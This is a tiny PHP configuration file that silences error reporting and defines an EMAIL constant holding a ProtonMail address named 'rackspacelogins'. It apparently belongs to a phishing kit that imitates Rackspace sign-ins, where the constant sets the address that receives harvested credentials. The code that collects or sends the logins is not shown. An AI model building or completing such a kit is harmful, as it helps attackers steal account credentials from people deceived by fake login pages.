<?php
error_reporting(0);
$ur_email   = "rackspacelogins@protonmail.com";
define("EMAIL", "$ur_email");
?>